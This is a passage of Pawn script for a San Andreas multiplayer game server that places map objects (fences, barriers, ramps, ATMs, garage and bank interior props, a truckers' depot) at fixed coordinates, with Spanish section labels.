	CreateDynamicObject(984,1287.09997559,-1365.69995117,13.19999981,0.00000000,0.00000000,0.00000000); //object(fenceshit2) (4)
	CreateDynamicObject(984,1287.09997559,-1352.90002441,13.19999981,0.00000000,0.00000000,0.00000000); //object(fenceshit2) (5)
	CreateDynamicObject(982,1287.09997559,-1333.69995117,13.19999981,0.00000000,0.00000000,0.00000000); //object(fenceshit) (1)
	CreateDynamicObject(982,1287.09997559,-1308.50000000,13.19999981,0.00000000,0.00000000,0.00000000); //object(fenceshit) (2)
	CreateDynamicObject(983,1287.09997559,-1294.09997559,13.19999981,0.00000000,0.00000000,0.00000000); //object(fenceshit3) (1)
	CreateDynamicObject(4597,1284.00000000,-1311.19995117,12.80000019,0.00000000,0.00000000,90.00000000); //object(crprkblok4_lan2) (1)
	CreateDynamicObject(4597,1284.19995117,-1361.80004883,12.80000019,0.00000000,0.00000000,90.00000000); //object(crprkblok4_lan2) (2)
	CreateDynamicObject(1251,1280.50000000,-1293.69995117,12.39999962,0.00000000,0.00000000,90.00000000); //object(smashbar) (1)
	CreateDynamicObject(1251,1280.30004883,-1301.09997559,12.39999962,0.00000000,0.00000000,90.00000000); //object(smashbar) (2)
	CreateDynamicObject(1251,1280.30004883,-1308.09997559,12.39999962,0.00000000,0.00000000,90.00000000); //object(smashbar) (3)
	CreateDynamicObject(1251,1280.59997559,-1315.09997559,12.39999962,0.00000000,0.00000000,90.00000000); //object(smashbar) (4)
	CreateDynamicObject(1251,1280.19995117,-1322.09997559,12.39999962,0.00000000,0.00000000,90.00000000); //object(smashbar) (5)
	CreateDynamicObject(1251,1280.40002441,-1329.09997559,12.39999962,0.00000000,0.00000000,90.00000000); //object(smashbar) (6)
	CreateDynamicObject(1251,1280.69995117,-1343.59997559,12.39999962,0.00000000,0.00000000,90.00000000); //object(smashbar) (7)
	CreateDynamicObject(1251,1280.59997559,-1351.00000000,12.39999962,0.00000000,0.00000000,90.00000000); //object(smashbar) (8)
	CreateDynamicObject(1251,1280.50000000,-1358.00000000,12.39999962,0.00000000,0.00000000,90.00000000); //object(smashbar) (9)
	CreateDynamicObject(1251,1280.69995117,-1365.00000000,12.39999962,0.00000000,0.00000000,90.00000000); //object(smashbar) (10)
	CreateDynamicObject(1251,1280.50000000,-1372.00000000,12.39999962,0.00000000,0.00000000,90.00000000); //object(smashbar) (11)
	CreateDynamicObject(1251,1280.59997559,-1378.90002441,12.39999962,0.00000000,0.00000000,90.00000000); //object(smashbar) (12)
	CreateDynamicObject(3462,1281.50000000,-1336.19995117,13.89999962,0.00000000,0.00000000,0.00000000); //object(csrangel_lvs) (1)
	CreateDynamicObject(983,1278.50000000,-1336.30004883,13.00000000,0.00000000,0.00000000,0.00000000); //object(fenceshit3) (3)
	CreateDynamicObject(983,1281.69995117,-1333.09997559,13.00000000,0.00000000,0.00000000,270.00000000); //object(fenceshit3) (4)
	CreateDynamicObject(983,1284.90002441,-1336.30004883,13.00000000,0.00000000,0.00000000,0.00000000); //object(fenceshit3) (5)
	CreateDynamicObject(983,1281.69995117,-1339.50000000,13.00000000,0.00000000,0.00000000,270.00000000); //object(fenceshit3) (6)
	CreateDynamicObject(3877,1279.09997559,-1333.80004883,14.19999981,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (1)
	CreateDynamicObject(3877,1279.00000000,-1338.90002441,14.19999981,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (1)
	CreateDynamicObject(3877,1284.40002441,-1339.00000000,14.19999981,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (1)
	CreateDynamicObject(3877,1284.30004883,-1333.69995117,14.19999981,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (1)
	CreateDynamicObject(4638,1270.00000000,-1337.59997559,14.19999981,0.00000000,0.00000000,0.00000000); //object(paypark_lan01) (3)
	CreateDynamicObject(3578,1268.90002441,-1341.00000000,11.60000038,0.00000000,0.00000000,90.00000000); //object(dockbarr1_la) (1)
	CreateDynamicObject(3578,1268.90002441,-1330.69995117,11.60000038,0.00000000,0.00000000,90.00000000); //object(dockbarr1_la) (1)
	CreateDynamicObject(3877,1271.69995117,-1290.80004883,14.19999981,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (1)
	CreateDynamicObject(3877,1273.50000000,-1290.90002441,14.19999981,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (1)
	CreateDynamicObject(3877,1273.69995117,-1385.00000000,14.19999981,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (1)
	CreateDynamicObject(3877,1271.50000000,-1384.90002441,14.19999981,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (1)

	//                          LICENCIAS
	CreateDynamicObject(18284,1415.80004883,-39.20000076,1002.90002441,0.00000000,0.00000000,0.00000000); //object(cw_tscanopy) (1)
	CreateDynamicObject(973,1400.00000000,-5.69999981,1000.79998779,0.00000000,0.00000000,359.99450684); //object(sub_roadbarrier) (5)
	CreateDynamicObject(973,1412.90002441,-10.60000038,1000.79998779,0.00000000,0.00000000,89.98901367); //object(sub_roadbarrier) (7)
	CreateDynamicObject(973,1404.50000000,-10.39999962,1000.79998779,0.00000000,0.00000000,89.98901367); //object(sub_roadbarrier) (8)
	CreateDynamicObject(973,1399.69995117,-24.79999924,1000.79998779,0.00000000,0.00000000,179.98901367); //object(sub_roadbarrier) (10)
	CreateDynamicObject(973,1404.50000000,-13.69999981,1000.79998779,0.00000000,0.00000000,90.00000000); //object(sub_roadbarrier) (11)
	CreateDynamicObject(973,1395.09997559,2.79999995,1000.79998779,0.00000000,0.00000000,0.00000000); //object(sub_roadbarrier) (12)
	CreateDynamicObject(973,1408.80004883,-24.79999924,1000.79998779,0.00000000,0.00000000,179.98352051); //object(sub_roadbarrier) (13)
	CreateDynamicObject(973,1411.09997559,-1.50000000,1000.79998779,0.00000000,0.00000000,111.98901367); //object(sub_roadbarrier) (14)
	CreateDynamicObject(973,1404.69995117,2.79999995,1000.79998779,0.00000000,0.00000000,0.00000000); //object(sub_roadbarrier) (15)
	CreateDynamicObject(973,1412.90002441,-20.00000000,1000.79998779,0.00000000,0.00000000,89.98901367); //object(sub_roadbarrier) (16)
	CreateDynamicObject(973,1400.09997559,-18.29999924,1000.79998779,0.00000000,0.00000000,180.00000000); //object(sub_roadbarrier) (17)
	CreateDynamicObject(973,1395.00000000,-29.50000000,1000.79998779,0.00000000,0.00000000,269.98352051); //object(sub_roadbarrier) (18)
	CreateDynamicObject(973,1400.00000000,-34.29999924,1000.79998779,0.00000000,0.00000000,359.97802734); //object(sub_roadbarrier) (19)
	CreateDynamicObject(973,1400.00000000,-40.50000000,1000.79998779,0.00000000,0.00000000,359.97802734); //object(sub_roadbarrier) (20)
	CreateDynamicObject(973,1391.00000000,-40.50000000,1000.79998779,0.00000000,0.00000000,359.97802734); //object(sub_roadbarrier) (21)
	CreateDynamicObject(973,1386.40002441,-35.79999924,1000.79998779,0.00000000,0.00000000,89.97802734); //object(sub_roadbarrier) (22)
	CreateDynamicObject(973,1386.40002441,-28.79999924,1000.79998779,0.00000000,0.00000000,89.97802734); //object(sub_roadbarrier) (23)
	CreateDynamicObject(973,1386.40002441,-23.10000038,1000.79998779,0.00000000,0.00000000,89.97802734); //object(sub_roadbarrier) (24)
	CreateDynamicObject(973,1391.09997559,-18.29999924,1000.79998779,0.00000000,0.00000000,179.97802734); //object(sub_roadbarrier) (25)
	CreateDynamicObject(973,1390.69995117,-5.69999981,1000.79998779,0.00000000,0.00000000,359.98901367); //object(sub_roadbarrier) (26)
	CreateDynamicObject(973,1385.69995117,2.79999995,1000.79998779,0.00000000,0.00000000,359.98901367); //object(sub_roadbarrier) (27)
	CreateDynamicObject(13593,1389.59997559,-2.79999995,1000.70001221,0.00000000,0.00000000,90.00000000); //object(kickramp03) (1)
	CreateDynamicObject(13593,1383.69995117,-3.00000000,1000.70001221,0.00000000,0.00000000,270.00000000); //object(kickramp03) (2)
	CreateDynamicObject(13593,1383.69995117,-0.20000000,1000.70001221,0.00000000,0.00000000,270.00000000); //object(kickramp03) (3)
	CreateDynamicObject(13593,1389.59997559,0.00000000,1000.70001221,0.00000000,0.00000000,90.00000000); //object(kickramp03) (4)
	CreateDynamicObject(5153,1386.59997559,-0.80000001,1001.20001221,0.00000000,25.00000000,270.50000000); //object(stuntramp7_las2) (1)
	CreateDynamicObject(5153,1386.50000000,-2.09999990,1001.20001221,0.00000000,24.99938965,270.49987793); //object(stuntramp7_las2) (2)
	CreateDynamicObject(973,1381.00000000,-5.69999981,1000.79998779,0.00000000,0.00000000,359.98901367); //object(sub_roadbarrier) (28)
	CreateDynamicObject(973,1371.69995117,-5.69999981,1000.79998779,0.00000000,0.00000000,359.98901367); //object(sub_roadbarrier) (29)
	CreateDynamicObject(973,1376.19995117,2.79999995,1000.79998779,0.00000000,0.00000000,359.98901367); //object(sub_roadbarrier) (30)
	CreateDynamicObject(973,1365.90002441,2.79999995,1000.79998779,0.00000000,0.00000000,359.98901367); //object(sub_roadbarrier) (31)
	CreateDynamicObject(973,1359.80004883,-1.20000005,1000.79998779,0.00000000,0.00000000,89.98901367); //object(sub_roadbarrier) (32)
	CreateDynamicObject(973,1359.80004883,-10.89999962,1000.79998779,0.00000000,0.00000000,89.98901367); //object(sub_roadbarrier) (33)
	CreateDynamicObject(973,1371.50000000,-18.29999924,1000.79998779,0.00000000,0.00000000,179.98901367); //object(sub_roadbarrier) (35)
	CreateDynamicObject(973,1359.80004883,-20.20000076,1000.79998779,0.00000000,0.00000000,89.98901367); //object(sub_roadbarrier) (36)
	CreateDynamicObject(973,1364.30004883,-24.89999962,1000.79998779,0.00000000,0.00000000,179.98901367); //object(sub_roadbarrier) (37)
	CreateDynamicObject(973,1373.69995117,-24.89999962,1000.79998779,0.00000000,0.00000000,179.98352051); //object(sub_roadbarrier) (38)
	CreateDynamicObject(973,1381.69995117,-18.29999924,1000.79998779,0.00000000,0.00000000,179.98352051); //object(sub_roadbarrier) (39)
	CreateDynamicObject(7894,1400.80004883,-12.00000000,1000.50000000,0.00000000,0.00000000,90.00000000); //object(vegascrashbar05) (1)
	CreateDynamicObject(973,1378.19995117,-29.60000038,1000.79998779,0.00000000,0.00000000,269.98352051); //object(sub_roadbarrier) (40)
	CreateDynamicObject(973,1373.59997559,-34.29999924,1000.79998779,0.00000000,0.00000000,179.97802734); //object(sub_roadbarrier) (41)
	CreateDynamicObject(973,1363.09997559,-34.29999924,1000.79998779,0.00000000,0.00000000,179.97253418); //object(sub_roadbarrier) (42)
	CreateDynamicObject(973,1381.50000000,-40.50000000,1000.79998779,0.00000000,0.00000000,179.97253418); //object(sub_roadbarrier) (44)
	CreateDynamicObject(973,1371.59997559,-40.50000000,1000.79998779,0.00000000,0.00000000,179.97253418); //object(sub_roadbarrier) (45)
	CreateDynamicObject(3380,1403.40002441,-11.69999981,999.90002441,0.00000000,0.00000000,280.00000000); //object(ce_hairpinl) (1)
	CreateDynamicObject(16023,1404.40002441,-33.40000153,1001.09997559,0.00000000,0.00000000,170.00000000); //object(des_trxingsign02) (1)
	CreateDynamicObject(16023,1405.19995117,-41.90000153,1001.09997559,0.00000000,0.00000000,169.99694824); //object(des_trxingsign02) (2)
	CreateDynamicObject(1315,1379.59997559,-25.70000076,1003.20001221,0.00000000,0.00000000,180.00000000); //object(trafficlight1) (1)
	CreateDynamicObject(1315,1387.69995117,0.69999999,1003.20001221,0.00000000,0.00000000,89.99450684); //object(trafficlight1) (2)
	CreateDynamicObject(1318,1403.50000000,-37.50000000,999.90002441,0.00000000,90.00000000,0.00000000); //object(arrow) (1)
	CreateDynamicObject(1318,1399.09997559,-37.20000076,999.90002441,0.00000000,90.00000000,0.00000000); //object(arrow) (2)
	CreateDynamicObject(1318,1391.30004883,-37.09999847,999.90002441,0.00000000,90.00000000,270.00000000); //object(arrow) (3)
	CreateDynamicObject(1318,1391.19995117,-29.79999924,999.90002441,0.00000000,90.00000000,270.00000000); //object(arrow) (4)
	CreateDynamicObject(1318,1391.19995117,-21.79999924,999.90002441,0.00000000,90.00000000,180.00000000); //object(arrow) (5)
	CreateDynamicObject(1318,1398.69995117,-21.70000076,999.90002441,0.00000000,90.00000000,179.99450684); //object(arrow) (6)
	CreateDynamicObject(1318,1409.50000000,-21.60000038,999.90002441,0.00000000,90.00000000,269.99450684); //object(arrow) (7)
	CreateDynamicObject(1318,1408.59997559,-3.79999995,999.90002441,0.00000000,90.00000000,309.98901367); //object(arrow) (8)
	CreateDynamicObject(1318,1399.80004883,-0.69999999,999.90002441,0.00000000,90.00000000,359.98474121); //object(arrow) (9)
	CreateDynamicObject(1318,1374.00000000,-1.39999998,999.90002441,0.00000000,90.00000000,359.98352051); //object(arrow) (10)
	CreateDynamicObject(1318,1374.19995117,-8.69999981,999.90002441,0.00000000,90.00000000,179.98352051); //object(arrow) (11)
	CreateDynamicObject(1318,1362.50000000,-8.00000000,999.90002441,0.00000000,90.00000000,89.98352051); //object(arrow) (12)
	CreateDynamicObject(1318,1366.59997559,-21.50000000,999.90002441,0.00000000,90.00000000,179.98352051); //object(arrow) (13)
	CreateDynamicObject(1318,1390.00000000,-9.30000019,999.90002441,0.00000000,90.00000000,179.98352051); //object(arrow) (14)
	CreateDynamicObject(1318,1390.50000000,-16.10000038,999.90002441,0.00000000,90.00000000,359.98352051); //object(arrow) (15)
	CreateDynamicObject(1318,1374.09997559,-15.60000038,999.90002441,0.00000000,90.00000000,359.97802734); //object(arrow) (16)
	CreateDynamicObject(1318,1383.00000000,-28.79999924,999.90002441,0.00000000,90.00000000,89.97802734); //object(arrow) (17)
	CreateDynamicObject(1318,1371.50000000,-37.40000153,999.90002441,0.00000000,90.00000000,359.97802734); //object(arrow) (18)
	CreateDynamicObject(1318,1370.90002441,-44.40000153,999.90002441,0.00000000,90.00000000,179.97802734); //object(arrow) (19)
	CreateDynamicObject(1337,2463.08007812,-852.18554688,102.53424835,0.00000000,0.00000000,0.00000000); //object(binnt07_la) (1)

	//                          CAJEROS AUTOMÁTICOS
	CreateDynamicObject(2942,2241.60009766,-1722.69995117,13.19999981,0.00000000,0.00000000,358.00000000); //object(kmb_atm1) (1)
	CreateDynamicObject(2942,2423.39990234,-2111.80004883,12.89999962,0.00000000,0.00000000,270.00000000); //object(kmb_atm1) (3)
	CreateDynamicObject(2942,1774.40002441,-1303.19995117,13.19999981,0.00000000,0.00000000,269.99450684); //object(kmb_atm1) (4)
	CreateDynamicObject(2942,488.00000000,-1269.19995117,15.39999962,0.00000000,0.00000000,35.98999023); //object(kmb_atm1) (6)
	CreateDynamicObject(2942,1539.19995117,-1611.40002441,13.19999981,0.00000000,0.00000000,270.00000000); //object(kmb_atm1) (7)
	CreateDynamicObject(2942,1497.09997559,-1022.20001221,23.50000000,0.00000000,0.00000000,358.00000000); //object(kmb_atm1) (8)
	CreateDynamicObject(2942,815.70001221,-1356.50000000,13.00000000,0.00000000,0.00000000,180.00000000); //object(kmb_atm1) (24)

	//                          GARAGE 1 PLAZA
	CreateDynamicObject(3354,424.89999390,-91.69999695,1002.20001221,0.00000000,0.00000000,270.00000000,-1,-1,-1,30); //object(burbdoor2ref) (1)
	CreateDynamicObject(11393,423.70001221,-99.19999695,1002.50000000,0.00000000,0.00000000,359.25000000,-1,-1,-1,30); //object(hubprops1_sfs) (1)

	//                          GARAGE 1 PLAZA -2-
	CreateDynamicObject(3354,424.89999390,-91.69999695,1002.20001221+10,0.00000000,0.00000000,270.00000000,-1,-1,-1,30); //object(burbdoor2ref) (1)
	CreateDynamicObject(11393,423.70001221,-99.19999695,1002.50000000+10,0.00000000,0.00000000,359.25000000,-1,-1,-1,30); //object(hubprops1_sfs) (1)

	//                          GARAGE 2 PLAZAS
	CreateDynamicObject(2395,1259.80004883,-863.29998779,1092.90002441,0.00000000,90.00000000,270.00000000,-1,-1,-1,30); //object(cj_sports_wall) (9)
	CreateDynamicObject(2395,1259.80004883,-860.59997559,1092.90002441,0.00000000,90.00000000,270.00000000,-1,-1,-1,30); //object(cj_sports_wall) (10)
	CreateDynamicObject(2395,1259.80004883,-857.90002441,1092.90002441,0.00000000,90.00000000,270.00000000,-1,-1,-1,30); //object(cj_sports_wall) (11)
	CreateDynamicObject(2395,1246.19995117,-860.79998779,1092.90002441,0.00000000,90.00000000,90.00000000,-1,-1,-1,30); //object(cj_sports_wall) (12)
	CreateDynamicObject(2395,1246.19995117,-863.50000000,1092.90002441,0.00000000,90.00000000,90.00000000,-1,-1,-1,30); //object(cj_sports_wall) (13)
	CreateDynamicObject(2395,1246.19995117,-866.20001221,1092.90002441,0.00000000,90.00000000,90.00000000,-1,-1,-1,30); //object(cj_sports_wall) (14)
	CreateDynamicObject(3354,1256.19995117,-858.09997559,1091.50000000,0.00000000,0.00000000,90.00000000,-1,-1,-1,30); //object(burbdoor2ref) (1)
	CreateDynamicObject(3354,1249.90002441,-858.09997559,1091.50000000,0.00000000,0.00000000,90.00000000,-1,-1,-1,30); //object(burbdoor2ref) (2)


	//                          BANCO INT
	CreateObject(18030,189.19999695,-118.40000153,1001.00000000,0.00000000,0.00000000,0.00000000); //object(gap) (2)

	CreateDynamicObject(18070,184.10000610,-106.59999847,999.09997559,0.00000000,0.00000000,0.00000000); //object(gap_counter) (1)
	CreateDynamicObject(630,191.69999695,-112.19999695,999.70001221,0.00000000,0.00000000,0.00000000); //object(veg_palmkb8) (1)
	CreateDynamicObject(1723,175.89999390,-109.80000305,998.59997559,0.00000000,0.00000000,90.00000000); //object(mrk_seating1) (3)
	CreateDynamicObject(2372,182.30000305,-110.80000305,998.59997559,0.00000000,0.00000000,0.00000000); //object(clothes_rail2) (2)
	CreateDynamicObject(2372,182.30000305,-113.00000000,998.59997559,0.00000000,0.00000000,0.00000000); //object(clothes_rail2) (3)
	CreateDynamicObject(2372,182.39999390,-115.59999847,998.59997559,0.00000000,0.00000000,0.00000000); //object(clothes_rail2) (4)
	CreateDynamicObject(2372,182.39999390,-117.80000305,998.59997559,0.00000000,0.00000000,0.00000000); //object(clothes_rail2) (5)
	CreateDynamicObject(2372,182.39999390,-120.00000000,998.59997559,0.00000000,0.00000000,0.00000000); //object(clothes_rail2) (6)
	CreateDynamicObject(2372,182.39999390,-122.19999695,998.59997559,0.00000000,0.00000000,0.00000000); //object(clothes_rail2) (7)
	CreateDynamicObject(2372,184.39999390,-110.80000305,998.59997559,0.00000000,0.00000000,0.00000000); //object(clothes_rail2) (9)
	CreateDynamicObject(2372,184.39999390,-113.00000000,998.59997559,0.00000000,0.00000000,0.00000000); //object(clothes_rail2) (10)
	CreateDynamicObject(2372,184.39999390,-115.19999695,998.59997559,0.00000000,0.00000000,0.00000000); //object(clothes_rail2) (11)
	CreateDynamicObject(2372,184.39999390,-117.40000153,998.59997559,0.00000000,0.00000000,0.00000000); //object(clothes_rail2) (12)
	CreateDynamicObject(2372,184.39999390,-119.59999847,998.59997559,0.00000000,0.00000000,0.00000000); //object(clothes_rail2) (13)
	CreateDynamicObject(2372,184.39999390,-121.80000305,998.59997559,0.00000000,0.00000000,0.00000000); //object(clothes_rail2) (14)
	CreateDynamicObject(2372,186.39999390,-110.80000305,998.59997559,0.00000000,0.00000000,0.00000000); //object(clothes_rail2) (16)
	CreateDynamicObject(2372,186.39999390,-113.00000000,998.59997559,0.00000000,0.00000000,0.00000000); //object(clothes_rail2) (17)
	CreateDynamicObject(2372,186.39999390,-115.59999847,998.59997559,0.00000000,0.00000000,0.00000000); //object(clothes_rail2) (18)
	CreateDynamicObject(2372,186.39999390,-117.80000305,998.59997559,0.00000000,0.00000000,0.00000000); //object(clothes_rail2) (19)
	CreateDynamicObject(2372,186.39999390,-120.00000000,998.59997559,0.00000000,0.00000000,0.00000000); //object(clothes_rail2) (20)
	CreateDynamicObject(2372,186.39999390,-122.19999695,998.59997559,0.00000000,0.00000000,0.00000000); //object(clothes_rail2) (21)
	CreateDynamicObject(1714,183.19999695,-106.90000153,998.59997559,0.00000000,0.00000000,0.00000000); //object(kb_swivelchair1) (1)
	CreateDynamicObject(1714,184.89999390,-106.90000153,998.59997559,0.00000000,0.00000000,0.00000000); //object(kb_swivelchair1) (2)
	CreateDynamicObject(2190,185.89999390,-108.50000000,999.59997559,0.00000000,0.00000000,220.00000000); //object(pc_1) (1)
	CreateDynamicObject(2190,181.89999390,-108.09999847,999.59997559,0.00000000,0.00000000,129.99572754); //object(pc_1) (2)
	CreateDynamicObject(1649,184.10000610,-108.40000153,1001.79998779,0.00000000,0.00000000,0.00000000); //object(wglasssmash) (1)
	CreateDynamicObject(1649,186.30000305,-106.19999695,1001.79998779,0.00000000,0.00000000,90.00000000); //object(wglasssmash) (3)
	CreateDynamicObject(1649,181.89999390,-106.19999695,1001.79998779,0.00000000,0.00000000,90.00000000); //object(wglasssmash) (4)
	CreateDynamicObject(2942,200.60000610,-125.30000305,999.29998779,0.00000000,0.00000000,270.00000000); //object(kmb_atm1) (1)
	CreateDynamicObject(2942,200.60000610,-127.40000153,999.29998779,0.00000000,0.00000000,270.00000000); //object(kmb_atm1) (2)
	CreateDynamicObject(2942,200.60000610,-129.39999390,999.29998779,0.00000000,0.00000000,270.00000000); //object(kmb_atm1) (3)
	CreateDynamicObject(3851,190.80000305,-131.89999390,1000.59997559,0.00000000,0.00000000,270.00000000); //object(carshowwin_sfsx) (1)
	CreateDynamicObject(3851,176.19999695,-131.89999390,1000.59997559,0.00000000,0.00000000,270.00000000); //object(carshowwin_sfsx) (3)
	CreateDynamicObject(1723,191.89999390,-105.69999695,998.59997559,0.00000000,0.00000000,270.00000000); //object(mrk_seating1) (5)
	CreateDynamicObject(1723,191.89999390,-109.30000305,998.59997559,0.00000000,0.00000000,270.00000000); //object(mrk_seating1) (6)
	CreateDynamicObject(1723,191.89999390,-113.00000000,998.59997559,0.00000000,0.00000000,270.00000000); //object(mrk_seating1) (7)
	CreateDynamicObject(1723,191.89999390,-116.80000305,998.59997559,0.00000000,0.00000000,270.00000000); //object(mrk_seating1) (8)
	CreateDynamicObject(630,191.80000305,-108.50000000,999.70001221,0.00000000,0.00000000,0.00000000); //object(veg_palmkb8) (3)
	CreateDynamicObject(630,191.89999390,-115.90000153,999.70001221,0.00000000,0.00000000,0.00000000); //object(veg_palmkb8) (4)
	CreateDynamicObject(630,191.80000305,-119.69999695,999.70001221,0.00000000,0.00000000,0.00000000); //object(veg_palmkb8) (5)
	CreateDynamicObject(630,176.00000000,-110.80000305,999.70001221,0.00000000,0.00000000,0.00000000); //object(veg_palmkb8) (6)
	CreateDynamicObject(1723,175.89999390,-113.59999847,998.59997559,0.00000000,0.00000000,90.00000000); //object(mrk_seating1) (9)
	CreateDynamicObject(630,176.30000305,-114.59999847,999.70001221,0.00000000,0.00000000,0.00000000); //object(veg_palmkb8) (7)
	CreateDynamicObject(1723,176.00000000,-117.50000000,998.59997559,0.00000000,0.00000000,90.00000000); //object(mrk_seating1) (10)
	CreateDynamicObject(630,176.30000305,-118.50000000,999.70001221,0.00000000,0.00000000,0.00000000); //object(veg_palmkb8) (8)
	CreateDynamicObject(1723,176.00000000,-121.30000305,998.59997559,0.00000000,0.00000000,90.00000000); //object(mrk_seating1) (11)
	CreateDynamicObject(630,176.39999390,-122.19999695,999.70001221,0.00000000,0.00000000,0.00000000); //object(veg_palmkb8) (9)
	CreateDynamicObject(2634,178.10000610,-104.50000000,1000.20001221,0.00000000,0.00000000,180.00000000); //object(ab_vaultdoor) (1)
	CreateDynamicObject(1886,182.80000305,-117.30000305,1003.29998779,0.00000000,0.00000000,0.00000000); //object(shop_sec_cam) (1)
	CreateDynamicObject(1886,183.19999695,-128.50000000,1003.50000000,0.00000000,0.00000000,0.00000000); //object(shop_sec_cam) (2)
	CreateDynamicObject(1886,178.39999390,-107.50000000,1003.50000000,0.00000000,0.00000000,0.00000000); //object(shop_sec_cam) (3)
	CreateDynamicObject(1886,178.19999695,-119.19999695,1003.50000000,0.00000000,0.00000000,0.00000000); //object(shop_sec_cam) (4)
	CreateDynamicObject(1886,192.69999695,-119.40000153,1003.50000000,0.00000000,0.00000000,0.00000000); //object(shop_sec_cam) (5)
	CreateDynamicObject(1886,192.80000305,-113.09999847,1003.50000000,0.00000000,0.00000000,0.00000000); //object(shop_sec_cam) (6)
	CreateDynamicObject(1886,198.00000000,-113.19999695,1003.50000000,0.00000000,0.00000000,0.00000000); //object(shop_sec_cam) (7)
	CreateDynamicObject(1886,197.89999390,-118.19999695,1003.50000000,0.00000000,0.00000000,0.00000000); //object(shop_sec_cam) (8)
	CreateDynamicObject(1536,183.39999390,-132.00000000,998.59997559,0.00000000,0.00000000,0.00000000); //object(gen_doorext15) (1)	//
	CreateDynamicObject(2873,180.60000610,-86.09999847,1002.20001221,0.00000000,0.00000000,0.00000000); //object(cj_suburb_door_2) (1)
	CreateDynamicObject(2873,208.10000610,-3.09999990,1001.40002441,0.00000000,0.00000000,0.00000000); //object(cj_suburb_door_2) (2)
	CreateDynamicObject(2873,201.19999695,-130.60000610,1003.70001221,0.00000000,0.00000000,0.00000000); //object(cj_suburb_door_2) (3)
	CreateDynamicObject(2873,213.80000305,-39.79999924,1002.20001221,0.00000000,0.00000000,0.00000000); //object(cj_suburb_door_2) (4)
	CreateDynamicObject(2873,215.10000610,-154.39999390,1000.70001221,0.00000000,0.00000000,0.00000000); //object(cj_suburb_door_2) (5)
	CreateDynamicObject(2873,216.69999695,-97.30000305,1005.40002441,0.00000000,0.00000000,0.00000000); //object(cj_suburb_door_2) (6)
	CreateDynamicObject(2378,183.00000000,-84.69999695,1002.59997559,0.00000000,0.00000000,270.00000000); //object(cj_jean_light) (1)
	CreateDynamicObject(2378,183.00000000,-83.90000153,1002.59997559,0.00000000,0.00000000,270.00000000); //object(cj_jean_light) (2)
	CreateDynamicObject(2384,182.69999695,-85.69999695,1001.09997559,0.00000000,0.00000000,0.00000000); //object(cj_8_jeans_dark) (1)
	CreateDynamicObject(2372,181.30000305,-83.19999695,1001.00000000,0.00000000,0.00000000,270.00000000); //object(clothes_rail2) (1)
	CreateDynamicObject(2689,182.30000305,-83.00000000,1001.70001221,0.00000000,0.00000000,270.00000000); //object(cj_hoodie_2) (1)
	CreateDynamicObject(2689,182.00000000,-83.00000000,1001.70001221,0.00000000,0.00000000,270.00000000); //object(cj_hoodie_2) (2)
	CreateDynamicObject(2689,181.60000610,-83.00000000,1001.70001221,0.00000000,0.00000000,270.00000000); //object(cj_hoodie_2) (3)
	CreateDynamicObject(2384,182.69999695,-84.69999695,1001.09997559,0.00000000,0.00000000,0.00000000); //object(cj_8_jeans_dark) (2)

	//                          CAMIONEROS
	CreateDynamicObject(3626,2430.69995117,-2115.50000000,14.00000000,0.00000000,0.00000000,179.99450684); //object(dckwrkhut) (1)
	CreateDynamicObject(3577,2436.89990234,-2116.00000000,13.30000019,0.00000000,0.00000000,270.00000000); //object(dockcrates1_la) (1)
	CreateDynamicObject(1724,2427.00000000,-2116.39990234,12.80000019,0.00000000,0.00000000,90.00000000); //object(mrk_seating1b) (1)
	CreateDynamicObject(2008,2428.00000000,-2115.19995117,12.80000019,0.00000000,0.00000000,270.00000000); //object(officedesk1) (1)
	CreateDynamicObject(1724,2429.69995117,-2116.30004883,12.80000019,0.00000000,0.00000000,230.00000000); //object(mrk_seating1b) (2)
	CreateDynamicObject(1724,2429.30004883,-2114.39990234,12.80000019,0.00000000,0.00000000,299.99877930); //object(mrk_seating1b) (3)
	CreateDynamicObject(2286,2432.50000000,-2117.60009766,14.30000019,0.00000000,0.00000000,180.00000000); //object(frame_5) (1)
	CreateDynamicObject(2284,2430.50000000,-2117.10009766,13.80000019,0.00000000,0.00000000,180.00000000); //object(frame_6) (1)
	CreateDynamicObject(2280,2426.89990234,-2115.89990234,13.60000038,0.00000000,0.00000000,90.00000000); //object(frame_thick_1) (1)
	CreateDynamicObject(2163,2427.60009766,-2114.00000000,13.89999962,0.00000000,0.00000000,0.00000000); //object(med_office_unit_2) (1)
	CreateDynamicObject(2167,2435.00000000,-2116.10009766,12.80000019,0.00000000,0.00000000,270.00000000); //object(med_office_unit_7) (1)
	CreateDynamicObject(2069,2434.60009766,-2114.30004883,12.80000019,0.00000000,0.00000000,0.00000000); //object(cj_mlight7) (1)
	CreateDynamicObject(3578,2535.69995117,-2083.89990234,11.89999962,0.00000000,0.00000000,0.00000000); //object(dockbarr1_la) (1)
	CreateDynamicObject(3578,2535.60009766,-2089.60009766,11.89999962,0.00000000,0.00000000,0.00000000); //object(dockbarr1_la) (2)
	CreateDynamicObject(3578,2535.50000000,-2095.60009766,11.89999962,0.00000000,0.00000000,0.00000000); //object(dockbarr1_la) (3)
	CreateDynamicObject(3578,2535.69995117,-2101.30004883,11.89999962,0.00000000,0.00000000,0.00000000); //object(dockbarr1_la) (4)
	CreateDynamicObject(3578,2535.89990234,-2106.80004883,11.89999962,0.00000000,0.00000000,0.00000000); //object(dockbarr1_la) (5)
	CreateDynamicObject(3578,2536.10009766,-2112.30004883,11.89999962,0.00000000,0.00000000,0.00000000); //object(dockbarr1_la) (6)
	CreateDynamicObject(3578,2535.60009766,-2079.50000000,11.89999962,0.00000000,0.00000000,0.00000000); //object(dockbarr1_la) (7)
	CreateDynamicObject(3578,2521.80004883,-2116.39990234,11.89999962,0.00000000,0.00000000,270.00000000); //object(dockbarr1_la) (8)
	CreateDynamicObject(3578,2515.50000000,-2116.39990234,11.89999962,0.00000000,0.00000000,270.00000000); //object(dockbarr1_la) (9)
	CreateDynamicObject(3578,2507.69995117,-2116.39990234,11.89999962,0.00000000,0.00000000,270.00000000); //object(dockbarr1_la) (10)
	CreateDynamicObject(3578,2498.00000000,-2116.39990234,11.89999962,0.00000000,0.00000000,270.00000000); //object(dockbarr1_la) (11)
